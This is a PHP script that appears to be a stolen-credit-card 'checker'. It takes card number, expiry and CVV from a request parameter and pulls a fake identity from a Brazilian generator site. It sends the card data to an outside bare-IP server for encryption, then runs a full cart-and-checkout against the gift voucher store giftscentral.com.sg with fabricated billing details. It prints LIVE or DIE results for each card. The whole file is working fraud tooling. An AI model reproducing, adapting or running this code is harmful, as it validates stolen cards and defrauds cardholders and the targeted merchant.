<?php
session_start();
error_reporting(0);
date_default_timezone_set("America/Sao_Paulo");
$time = time();

function multiexplode($string){
    $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function multiexplode2($string){
  $delimiters = array(" ");
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}


function multiexplode3($string){
  $delimiters = array(".","-");
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}


function trazer($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function gerarCPF() {
    for ($i = 0; $i < 9; $i++) {
      $cpf[$i] = mt_rand(0, 9);
    }
  
    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
      $soma += ($cpf[$i] * (10 - $i));
    }
    $resto = $soma % 11;
    $cpf[9] = ($resto < 2) ? 0 : (11 - $resto);
  
    $soma = 0;
    for ($i = 0; $i < 10; $i++) {
      $soma += ($cpf[$i] * (11 - $i));
    }
    $resto = $soma % 11;
    $cpf[10] = ($resto < 2) ? 0 : (11 - $resto);
  
    return implode('', $cpf);
}

function generate_email() {
    $domains = array("gmail.com", "hotmail.com", "yahoo.com", "outlook.com");
    $domain = $domains[array_rand($domains)];
    $timestamp = time(); // timestamp atual em segundos
    $random_num = mt_rand(1, 10000); // número aleatório entre 1 e 10000
    $email = "user_" . $timestamp . "_" . $random_num . "@$domain";
    return $email;
}

// $email = generate_email();
// $cpf = gerarCPF();


$lista = $_GET['lista'];
$cc = multiexplode($lista)[0];

$mes = multiexplode($lista)[1];

if($mes == '01'){
  $mes2 = '1';
}elseif($mes == '02'){
  $mes2 = '2';
}elseif($mes == '03'){
  $mes2 = '3';
}elseif($mes == '04'){
  $mes2 = '4';
}elseif($mes == '05'){
  $mes2 = '5';
}elseif($mes == '06'){
  $mes2 = '6';
}elseif($mes == '07'){
  $mes2 = '7';
}elseif($mes == '08'){
  $mes2 = '8';
}elseif($mes == '09'){
  $mes2 = '9';
}else{
  $mes2 = $mes;
}


$ano = multiexplode($lista)[2];
$ano2 = substr($ano, 2, 4);
$cvv = multiexplode($lista)[3];

$parte1 = substr($cc, 0, 4);
$parte2 = substr($cc, 4, 6);
$parte3 = substr($cc, 10, 10);

function deletarCookies() { 
if (file_exists("cookies.txt")) { 
unlink("cookies.txt"); 
}}
    

$json_str = file_get_contents('bins.json');
$bins     = json_decode($json_str, true);
$bin      = substr($cc, 0, 6);
if (isset($bins[$bin])) {

    $a = json_encode($bins[$bin]);

    $bandeira = trazer($a, 'bandeira":"', '"');
    $nivel    = trazer($a, 'level":"', '"');
    $bank     = trazer($a, 'banco":"', '"');
    $pais     = trazer($a, 'pais":"', '"');
    $puxad    = " $bandeira$nivel $bank $pais";
} else {

function bin ($cc){
$contents = file_get_contents("bins.csv");
$pattern = preg_quote(substr($cc, 0, 6), '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
$encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
return "$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]";
}
$bin = bin($lista);
}


$numero3 = rand(1,15);


$deletar = deletarCookies();
$cookieFile = getcwd() . "/cookies$numero3.txt";

$numero = rand(1,999999);




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.4devs.com.br/ferramentas_online.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.4devs.com.br',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'content-type: application/x-www-form-urlencoded',
    'accept: */*',
    'origin: https://www.4devs.com.br',
    'referer: https://www.4devs.com.br/gerador_de_pessoas',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');

$response = curl_exec($ch);

$cpf = trazer($response, 'cpf":"','"',1);
$nomecompleto = trazer($response, 'nome":"','"',1);

####################################################################################

$nome = multiexplode2($nomecompleto)[0];
$sobrenome = multiexplode2($nomecompleto)[1];

$nomeesobrenome = $nome . ' ' . $sobrenome;

####################################################################################

$parte1cpf = multiexplode3($cpf)[0];
$parte2cpf = multiexplode3($cpf)[1];
$parte3cpf = multiexplode3($cpf)[2];
$parte4cpf = multiexplode3($cpf)[3];

$cpfinteiro = $parte1cpf . $parte2cpf . $parte3cpf . $parte4cpf;


$email = "$nome$numero@gmail.com";


####################################################################################


$key = '10001|B38F08A611FA3E94973ED9999FA70C121182435158E43E74FC421E048DEC2429C3FB31F95EDF8358717CF030F0F9CFF6111284E2AAEFE8E07C521CFEBC2FD96BB85B85BA99ECAABE3A2C439CFFD0915DA1610799A1F33A41C32F5464110739DACF63CEECEA3F0372A7B2A13154B353400000D50C73C95F786DBF05A1BC30E714B9A0363F597BB15E0EBF48F98903A7F7E4C015F68C2540B93F81C50DB0C934F5848FBEECF944565D2D83A78E0F3F8DEF642835E3FD43F9F6E0516425E0300A91238F0F706A66582953C7C480CFD4C6371F1F8610C35FD574BEF6F35D96E73AE74DDAB9F35E8D7BA5813950C395FCE26BB472ACFA744499C61C8894F9F9061B77';



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://3.145.78.194:3000/adyenjs?version=25&key='.$key.'&card='.$cc.'&month='.$mes.'&year='.$ano.'&cvv='.$cvv.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'Cache-Control: max-age=0',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile); 
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
$response = curl_exec($ch);


$cvv3 = trazer($response, 'cvv":"','"',1);
$mes3 = trazer($response, 'cardMonth":"','"',1);
$ano3 = trazer($response, 'cardYear":"','"',1);
$cc3 = trazer($response, 'cardNumber":"','"',1);





$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.giftscentral.com.sg/api/v2/storefront/cart');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.giftscentral.com.sg',
    'x-store-id: 778',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'content-type: application/json',
    'x-currency: SGD',
    'accept: application/json, text/plain, */*',
    'origin: https://www.giftscentral.com.sg',
    'referer: https://www.giftscentral.com.sg/hotel-monetary-voucher-036389',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile); 
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');

$response = curl_exec($ch);

$token1 = trazer($response, 'cart","token":"','"',1);




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.giftscentral.com.sg/api/v2/storefront/cart/add_item');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.giftscentral.com.sg',
    'x-store-id: 778',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'content-type: application/json',
    'x-currency: SGD',
    'x-spree-order-token: '.$token1.'',
    'accept: application/json, text/plain, */*',
    'origin: https://www.giftscentral.com.sg',
    'referer: https://www.giftscentral.com.sg/hotel-monetary-voucher-036389',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile); 
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"variants":[{"id":"97258","quantity":"1","options":{"glo_api":true,"vendor_id":2365,"customization_options":[{"customization_option_id":"47738","value":null}],"user_currency":"SGD","store_id":"778","receipient_email":"","receipient_first_name":"","receipient_last_name":"","receipient_phone_number":"","message":"","sender_name":""}}],"buy_now_button":false,"cart_changed":true}');

$response = curl_exec($ch);




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.giftscentral.com.sg/api/v2/storefront/cart?&fields[cart]=store_tax_labels,shipments_count,minimum_order_value,pickup_address,timeslots,blocked_dates,product_type,updated_at,token,price_values,state,all_line_items_type,line_items_with_types,giftcard_payments,valid_for_promotional_code,coupon_code,shipments,shipping_address,number,total,currency,email,user_id,store_id,pickup_and_digital,cart_token&selected=true&generate_cart_token=true');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.giftscentral.com.sg',
    'x-store-id: 778',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'content-type: application/json',
    'x-currency: SGD',
    'x-spree-order-token: '.$token1.'',
    'accept: application/json, text/plain, */*',
    'referer: https://www.giftscentral.com.sg/checkout',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile); 
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
$response = curl_exec($ch);

$token2 = trazer($response, 'cart_token":"','"',1);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.giftscentral.com.sg/api/v2/storefront/checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.giftscentral.com.sg',
    'x-spree-cart-token: '.$token2.'',
    'x-store-id: 778',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'content-type: application/json',
    'x-currency: SGD',
    'x-spree-order-token: '.$token1.'',
    'accept: application/json, text/plain, */*',
    'origin: https://www.giftscentral.com.sg',
    'referer: https://www.giftscentral.com.sg/checkout',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile); 
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"order":{"email":"'.$email.'","bill_address_attributes":{"firstname":"'.$nome.'","lastname":"'.$sobrenome.'","address1":"84, new york","address2":null,"city":"new york","phone":"2345678900","zipcode":"10080","state_name":"New York","state_id":"","apartment_no":null,"estate_name":null,"region":null,"district":null,"country_iso":"US","user_id":null},"ship_address_attributes":{"firstname":"'.$nome.'","lastname":"'.$sobrenome.'","address1":"84, new york","address2":null,"city":"new york","phone":"2345678900","zipcode":"10080","state_name":"New York","state_id":"","apartment_no":null,"estate_name":null,"region":null,"district":null,"country_iso":"US","user_id":null},"updated_at":"2024-09-02T23:57:35.798Z","current_context":"cart","customer_first_name":"","customer_last_name":"","customer_comment":""},"apply_giftcard":false}');

$response = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.giftscentral.com.sg/api/v2/storefront/line_items/bulk_update');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.giftscentral.com.sg',
    'x-spree-cart-token: '.$token2.'',
    'x-store-id: 778',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'content-type: application/json',
    'accept: application/json, text/plain, */*',
    'x-spree-order-token: '.$token1.'',
    'origin: https://www.giftscentral.com.sg',
    'referer: https://www.giftscentral.com.sg/checkout',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile); 
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"line_items":{"257648":{"receipient_first_name":"Edson","receipient_last_name":"silva","sender_name":"'.$nomecompleto.'","receipient_email":"vitinc'.$numero.'@gmail.com"}}}');

$response = curl_exec($ch);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.giftscentral.com.sg/api/v2/storefront/checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.giftscentral.com.sg',
    'x-spree-cart-token: '.$token2.'',
    'x-store-id: 778',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'content-type: application/json',
    'x-currency: SGD',
    'x-spree-order-token: '.$token1.'',
    'accept: application/json, text/plain, */*',
    'origin: https://www.giftscentral.com.sg',
    'referer: https://www.giftscentral.com.sg/checkout',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile); 
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"apply_giftcard":false,"order":{"payments_attributes":[{"payment_method_id":"441","source_attributes":{"name":"'.$nomecompleto.'","number":"'.$cc3.'","month":"'.$mes3.'","year":"'.$ano3.'","verification_value":"'.$cvv3.'","browserInfo":{"acceptHeader":"*/*","colorDepth":24,"language":"pt-BR","javaEnabled":false,"screenHeight":1080,"screenWidth":1920,"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0","timeZoneOffset":180},"cc_type":"visa"}}],"updated_at":"2024-09-03T00:06:30.420Z"}}');

$response = curl_exec($ch);


$retorno = trazer($response, 'error":"','|',1);


if(strpos($response, 'CVC Declined')){

  echo "[LIVE] CVC Declined (" . (time() - $time) . " Segundos) @vitin_dev";

}elseif(strpos($response, 'Internal Server Error')){

  echo "[DIE] 3DS Failure ( VBV ) - (" . (time() - $time) . " Segundos) @vitin_dev";

}else{

  echo "[DIE] $retorno(" . (time() - $time) . " Segundos) @vitin_dev";

}



